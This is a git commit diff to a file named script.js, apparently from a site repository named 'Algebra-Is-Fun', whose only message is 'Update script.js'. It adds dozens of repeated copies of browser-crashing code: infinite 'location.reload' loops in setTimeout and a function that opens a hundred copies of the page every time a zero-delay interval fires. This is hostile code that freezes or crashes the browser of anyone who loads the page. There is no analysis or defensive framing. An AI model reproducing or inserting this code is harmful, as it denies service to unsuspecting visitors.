f6df235034c47327e63d47e615eb3f75cd9a5cb2
Algebra-Is-Fun <xpixelcoderxqa@gmail.com>
2025-05-08 19:49:08 -0400

    Update script.js

--- script.js
+++ script.js
@@ -15,6 +15,391 @@ setTimeout(function(){
 setTimeout(function(){
     while(1)location.reload(1)
 }, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+setTimeout(function(){
+    while(1)location.reload(1)
+}, 1000)
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
+function rep() {
+  for (var i = 0; i < 100; i++) {
+    open(location.href);
+  }
+}
+
+setInterval(rep, 0);
 function rep() {
   for (var i = 0; i < 100; i++) {
     open(location.href);
